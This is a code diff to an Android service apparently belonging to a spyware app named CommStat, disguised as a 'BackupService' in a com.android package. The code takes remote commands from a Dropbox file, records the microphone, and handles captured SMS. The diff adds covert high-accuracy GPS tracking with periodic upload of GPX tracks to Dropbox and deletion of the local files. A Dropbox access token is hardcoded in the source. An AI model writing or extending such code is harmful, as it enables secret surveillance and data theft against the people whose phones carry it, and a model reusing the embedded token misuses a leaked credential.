@@ -5,14 +5,20 @@ import android.app.IntentService;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.location.Location;
+import android.os.Bundle;
 import android.os.IBinder;
+import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
+import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.text.TextUtils;
 import android.util.Log;
 
 import com.android.commstat.AudioRecorder;
+import com.android.commstat.Gpx;
 import com.android.commstat.IOUtils;
+import com.android.commstat.R;
 import com.android.commstat.model.CommandSettings;
 import com.android.commstat.model.Sms;
 import com.dropbox.core.DbxException;
@@ -21,6 +27,11 @@ import com.dropbox.core.v2.DbxClientV2;
 import com.dropbox.core.v2.files.ListFolderResult;
 import com.dropbox.core.v2.files.Metadata;
 import com.dropbox.core.v2.files.WriteMode;
+import com.google.android.gms.common.ConnectionResult;
+import com.google.android.gms.common.api.GoogleApiClient;
+import com.google.android.gms.location.LocationListener;
+import com.google.android.gms.location.LocationRequest;
+import com.google.android.gms.location.LocationServices;
 
 import java.io.BufferedReader;
 import java.io.File;
@@ -44,11 +55,7 @@ public class BackupService extends IntentService {
 
     public static final String SMS = "sms";
     public static final String SEND_FILES = "send_files";
-    public static final String RECORD_MIC = "record_mic";
     public static final String EXTRA_FILES_FOLDER = "files_folder";
-    public static final String RECORDS_FOLDER = "records";
-    public static final String COMMAND_EXTRA = "command";
-    public static final String CHECK_COMMAND = "commstat.permission.CHECK_COMMAND";
 
     private static final String DROPBOX_ACCESS_TOKEN = "Y09locXg68AAAAAAAAAAXrx09PJ-YKhiCHJqWpgiVrmgBJ22iP4o4_TRK5QqZCM2";
     private static final String MESSAGES_FOLDER = "messages";
@@ -72,7 +79,7 @@ public class BackupService extends IntentService {
         if (intent == null || intent.getExtras() == null) {
             return;
         }
-        if(TextUtils.equals(intent.getAction(), SMS)) {
+        if (TextUtils.equals(intent.getAction(), SMS)) {
             Object messageObj = intent.getExtras().getSerializable(SMS);
             if (messageObj != null) {
                 if (messageObj instanceof Sms) {
@@ -82,12 +89,13 @@ public class BackupService extends IntentService {
                     startQueue();
                 }
             }
-        } else if(TextUtils.equals(intent.getAction(), SEND_FILES)) {
+        } else if (TextUtils.equals(intent.getAction(), SEND_FILES)) {
             String filesFolder = intent.getStringExtra(EXTRA_FILES_FOLDER);
-            if(filesFolder != null) {
+            if (filesFolder != null) {
                 sendFiles(filesFolder);
             }
-        } if(TextUtils.equals(intent.getAction(), CHECK_COMMAND)) {
+        }
+        if (getString(R.string.CheckCommandAction).equals(intent.getAction())) {
             checkCommands();
         }
     }
@@ -95,7 +103,7 @@ public class BackupService extends IntentService {
     private void checkCommands() {
         final String commandsFileName = "commands.txt";
         DbxClientV2 client = new DbxClientV2(DbxRequestConfig.newBuilder("CommStat").build(), DROPBOX_ACCESS_TOKEN);
-        ListFolderResult result = null;
+        ListFolderResult result;
         Metadata commandsFileMetadata = null;
         try {
             result = client.files().listFolder("");
@@ -133,7 +141,7 @@ public class BackupService extends IntentService {
         } catch (DbxException e) {
             e.printStackTrace();
         }
-        if(!commandsFile.exists()) {
+        if (!commandsFile.exists()) {
             return;
         }
         FileInputStream is = null;
@@ -142,13 +150,11 @@ public class BackupService extends IntentService {
             InputStreamReader inputreader = new InputStreamReader(is);
             BufferedReader buffreader = new BufferedReader(inputreader);
             String line;
-            try
-            {
+            try {
                 while ((line = buffreader.readLine()) != null) {
                     execCommand(line);
                 }
-            }catch (Exception e)
-            {
+            } catch (Exception e) {
                 e.printStackTrace();
             } finally {
                 IOUtils.closeQuietly(buffreader);
@@ -159,14 +165,14 @@ public class BackupService extends IntentService {
         } finally {
             IOUtils.closeQuietly(is);
         }
-        if(commandsFile.exists()) {
+        if (commandsFile.exists()) {
             commandsFile.delete();
         }
     }
 
     private void execCommand(String command) {
         CommandSettings commandSettings = new CommandSettings(command);
-        if(commandSettings.getCommandType() == null) {
+        if (commandSettings.getCommandType() == null) {
             return;
         }
         switch (commandSettings.getCommandType()) {
@@ -174,30 +180,39 @@ public class BackupService extends IntentService {
                 recordMic(commandSettings);
                 break;
             case RecordLocation:
+                recordLocation(commandSettings);
                 break;
         }
     }
 
-    private void recordMic(CommandSettings command) {
-        if(command == null) {
+    private void recordLocation(CommandSettings command) {
+        if (command == null || command.getTotalDuration() == 0) {
             return;
         }
-        if(command.getDuration() == 0 && command.getTotalDuration() == 0) {
+        try {
+            new LocationRecordTask(command.getTotalDuration(), command.getDuration()).start();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void recordMic(CommandSettings command) {
+        if (command == null || (command.getDuration() == 0 && command.getTotalDuration() == 0)) {
             return;
         }
         Calendar calendar = Calendar.getInstance();
         calendar.add(Calendar.MILLISECOND, command.getTotalDuration());
-        FinishListener listener = new FinishListener(calendar.getTime(), command.getDelay(), command.getDuration(), command.getTotalDuration());
-        new RecordTask(command.getDuration() == 0 ? command.getTotalDuration() : command.getDuration(), listener).start();
+        MicFinishListener listener = new MicFinishListener(calendar.getTime(), command.getDelay(), command.getDuration(), command.getTotalDuration());
+        new MicRecordTask(command.getDuration() == 0 ? command.getTotalDuration() : command.getDuration(), listener).start();
     }
 
-    class FinishListener implements OnFinishListener {
+    class MicFinishListener implements OnFinishListener {
         private final Date mFinishTime;
         private final int mDelay;
         private final int mDuration;
         private final int mTotalDuration;
 
-        FinishListener(Date finishTime, int delay, int duration, int totalDuration) {
+        MicFinishListener(Date finishTime, int delay, int duration, int totalDuration) {
             mFinishTime = finishTime;
             mDelay = delay;
             mDuration = duration;
@@ -209,11 +224,11 @@ public class BackupService extends IntentService {
             Calendar calendar = Calendar.getInstance();
             calendar.add(Calendar.MILLISECOND, mDelay);
             calendar.add(Calendar.MILLISECOND, mDuration);
-            if(mFinishTime.getTime() > calendar.getTime().getTime()) {
+            if (mFinishTime.getTime() > calendar.getTime().getTime()) {
                 new Timer().schedule(new TimerTask() {
                     @Override
                     public void run() {
-                        new RecordTask(mDuration <= 0 ? mTotalDuration : mDuration, FinishListener.this).start();
+                        new MicRecordTask(mDuration <= 0 ? mTotalDuration : mDuration, MicFinishListener.this).start();
                     }
                 }, mDelay);
             }
@@ -224,7 +239,107 @@ public class BackupService extends IntentService {
         void onFinish();
     }
 
-    class RecordTask {
+    class LocationRecordTask implements GoogleApiClient.ConnectionCallbacks, GoogleApiClient.OnConnectionFailedListener, LocationListener {
+        private static final String TRACKS_FOLDER = "tracks";
+        private LocationRequest mLocationRequest;
+        private Gpx mRecorder;
+        private long mDuration;
+        private long mSendInterval;
+        private Timer mStopTimer;
+        private Timer mSendTimer;
+        private boolean mIsStop;
+        private File mFilePath;
+        private GoogleApiClient mLocationClient;
+
+        LocationRecordTask(long duration, long sendInterval) throws IOException {
+            mFilePath = new File(makeFilePath(BackupService.this, TRACKS_FOLDER, "gpx"));
+            mRecorder = new Gpx(BackupService.this, mFilePath);
+            mDuration = duration;
+            mSendInterval = sendInterval;
+            if (ActivityCompat.checkSelfPermission(BackupService.this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
+                    ActivityCompat.checkSelfPermission(BackupService.this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+                mLocationRequest = LocationRequest.create()
+                        .setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY)
+                        .setInterval(3000);
+            }
+        }
+
+        void start() {
+            if (mLocationRequest == null) {
+                return;
+            }
+            mIsStop = false;
+            mLocationClient = new GoogleApiClient.Builder(BackupService.this)
+                    .addConnectionCallbacks(this)
+                    .addOnConnectionFailedListener(this)
+                    .addApi(LocationServices.API)
+                    .build();
+            mLocationClient.connect();
+            mSendTimer = new Timer();
+            if (mSendInterval > 0) {
+                mSendTimer.schedule(new TimerTask() {
+                    @Override
+                    public void run() {
+                        if (mRecorder.prepareGpx()) {
+                            sendFiles(mFilePath.getParentFile().getAbsolutePath());
+                        }
+                    }
+                }, mSendInterval, mSendInterval);
+            }
+            mStopTimer = new Timer();
+            mStopTimer.schedule(new TimerTask() {
+                @Override
+                public void run() {
+                    stop();
+                    if (mRecorder.prepareGpx()) {
+                        sendFiles(mFilePath.getParentFile().getAbsolutePath());
+                    }
+                    mRecorder.clean();
+                }
+            }, mDuration);
+        }
+
+        void stop() {
+            if (mStopTimer != null) {
+                mStopTimer.cancel();
+                mStopTimer.purge();
+                mStopTimer = null;
+            }
+            if (mSendTimer != null) {
+                mSendTimer.cancel();
+                mSendTimer.purge();
+                mSendTimer = null;
+            }
+            if (!mIsStop) {
+                mIsStop = true;
+            }
+        }
+
+        @Override
+        public void onConnected(@Nullable Bundle bundle) {
+            if (ActivityCompat.checkSelfPermission(BackupService.this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+                    || ActivityCompat.checkSelfPermission(BackupService.this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+                LocationServices.FusedLocationApi.requestLocationUpdates(mLocationClient, mLocationRequest, this);
+            }
+        }
+
+        @Override
+        public void onConnectionSuspended(int i) {
+        }
+
+        @Override
+        public void onConnectionFailed(@NonNull ConnectionResult connectionResult) {
+            stop();
+        }
+
+        @Override
+        public void onLocationChanged(Location location) {
+            mRecorder.addPoint(location);
+        }
+    }
+
+    class MicRecordTask {
+        private static final String RECORDS_FOLDER = "records";
         private AudioRecorder mRecorder;
         private long mDuration;
         private Timer mStopTimer;
@@ -232,8 +347,8 @@ public class BackupService extends IntentService {
         private OnFinishListener mOnFinishListener;
         private String mFilePath;
 
-        RecordTask(long duration, OnFinishListener onFinishListener) {
-            mFilePath = makeFilePath(BackupService.this, RECORDS_FOLDER);
+        MicRecordTask(long duration, OnFinishListener onFinishListener) {
+            mFilePath = makeFilePath(BackupService.this, RECORDS_FOLDER, "3gp");
             mRecorder = new AudioRecorder(mFilePath);
             mDuration = duration;
             mOnFinishListener = onFinishListener;
@@ -268,12 +383,12 @@ public class BackupService extends IntentService {
         }
     }
 
-    public String makeFilePath(Context context, String folderName) {
+    public String makeFilePath(Context context, String folderName, String extension) {
         File recordsDir = new File(context.getFilesDir().getAbsolutePath(), folderName);
         if (!recordsDir.exists() && !recordsDir.mkdir()) {
             return null;
         }
-        String fileName = new SimpleDateFormat("MM-dd_HH-mm-ss", Locale.getDefault()).format(Calendar.getInstance().getTime()) + ".3gp";
+        String fileName = new SimpleDateFormat("MM-dd_HH-mm-ss", Locale.getDefault()).format(Calendar.getInstance().getTime()) + "." + extension;
         File file = new File(recordsDir, fileName);
         return file.getAbsolutePath();
     }
@@ -343,11 +458,25 @@ public class BackupService extends IntentService {
                 if (dbFolder == null) {
                     client.files().createFolder("/" + dirName);
                 }
+                result = client.files().listFolder(dbFolder.getPathLower());
+                Metadata fileMetadata = null;
+                while (true) {
+                    for (Metadata metadata : result.getEntries()) {
+                        if (TextUtils.equals(metadata.getName(), innerFile.getName())) {
+                            fileMetadata = metadata;
+                            break;
+                        }
+                    }
+                    if (!result.getHasMore()) {
+                        break;
+                    }
+                    result = client.files().listFolderContinue(result.getCursor());
+                }
                 InputStream is = null;
                 try {
                     is = new FileInputStream(innerFile);
                     client.files().uploadBuilder("/" + dirName + "/" + innerFile.getName())
-                            .withMode(WriteMode.ADD)
+                            .withMode(fileMetadata != null ? WriteMode.OVERWRITE : WriteMode.ADD)
                             .uploadAndFinish(is);
                     innerFile.delete();
                 } finally {
